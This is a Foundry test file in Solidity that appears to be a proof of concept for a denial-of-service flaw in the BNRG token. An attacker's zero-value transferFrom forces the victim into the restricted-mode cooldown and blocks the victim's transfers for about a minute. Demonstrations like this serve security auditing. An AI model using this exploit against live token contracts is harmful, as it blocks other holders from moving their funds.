// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/BNRG.sol";

contract DOSBNRGTest is Test {
    BNRG token;
    address owner = address(0x1);
    address attacker = address(0x2);
    address victim = address(0x3);
    address receiver = address(0x4);
    
    function setUp() public {
        vm.startPrank(owner);
        token = new BNRG();
        token.mint(100000 ether);
        token.transfer(victim, 1000 ether);
        token.setBotProtection(true);
        token.setRestrictionAmount(type(uint256).max);
        vm.stopPrank();
    }

    function test_RestrictedModeDOS() public {
        uint256 transferAmount = 100 ether;
        uint256 initialBlockTime = 1000000;
        uint256 cooldown = 60; // Cooldown period in seconds

        // 1. Prepare pre-attack state (out of any cooldown period)
        vm.warp(initialBlockTime);
        
        console.log("--- BEFORE-Trigger Transfer (Pre-Attack) ---");
        // Victim performs initial transfer when out of cooldwn
        uint256 victimBalanceBefore = token.balanceOf(victim);
        uint256 receiverBalanceBefore = token.balanceOf(receiver);
        console.log("Victim balance before pre-attack transfer:", victimBalanceBefore);
        console.log("Receiver balance before pre-attack transfer:", receiverBalanceBefore);

        vm.prank(victim);
        token.transfer(receiver, transferAmount);
        
        // Confirm successful transfer
        uint256 victimBalanceAfter = token.balanceOf(victim);
        uint256 receiverBalanceAfter = token.balanceOf(receiver);
        console.log("Victim balance after pre-attack transfer:", victimBalanceAfter);
        console.log("Receiver balance after pre-attack transfer:", receiverBalanceAfter);
        assertEq(
            victimBalanceAfter, 
            victimBalanceBefore - transferAmount,
            "Pre-attack transfer failed"
        );

        // 2. Pass cooldown period to reset victim's timer
        vm.warp(initialBlockTime + cooldown + 1);  // Ensure out of cooldown
        console.log("--- Cooldown Reset ---");
        console.log("Warped to block.timestamp:", block.timestamp);
        
        console.log("--- Trigger Attack ---");
        // Attacker forces victim into cooldown
        vm.prank(attacker);
        token.transferFrom(victim, attacker, 0);
        console.log("Attack executed: Attacker performed 0-value transferFrom");

        console.log("--- AFTER-Trigger Transfer (Post-Attack) ---");
        // Immediately attempt victim transfer (should fail)
        uint256 victimPreAttemptBalance = token.balanceOf(victim);
        uint256 receiverPreAttemptBalance = token.balanceOf(receiver);
        console.log("Victim balance before post-attempt:", victimPreAttemptBalance);
        console.log("Receiver balance before post-attempt:", receiverPreAttemptBalance);

        vm.prank(victim);
        vm.expectRevert("BMON: only one tx/min in restricted mode");
        token.transfer(receiver, transferAmount);
        console.log("Post-attack transfer reverted (as expected)");

        // 3. Verify subsequent behavior remains consistent
        console.log("--- Time-Based Validation ---");
        uint256 attackTime = block.timestamp;
        console.log("Attack timestamp:", attackTime);
        
        // Verify still fails after 59 seconds
        vm.warp(attackTime + 59);
        vm.prank(victim);
        vm.expectRevert("BMON: only one tx/min in restricted mode");
        token.transfer(owner, transferAmount);
        console.log("Transfer after 59 seconds reverted (as expected)");
        
        // Succeeds after full cooldown
        vm.warp(attackTime + cooldown + 1);
        vm.prank(victim);
        token.transfer(owner, transferAmount);
        console.log("Transfer after cooldown succeeded");
        
        // Final balance verification
        assertEq(
            token.balanceOf(victim),
            victimPreAttemptBalance - transferAmount,
            "Final victim balance incorrect"
        );
        
        console.log("Vulnerability Exists: Attack successfully prevents victim transactions during cooldown");
    }
}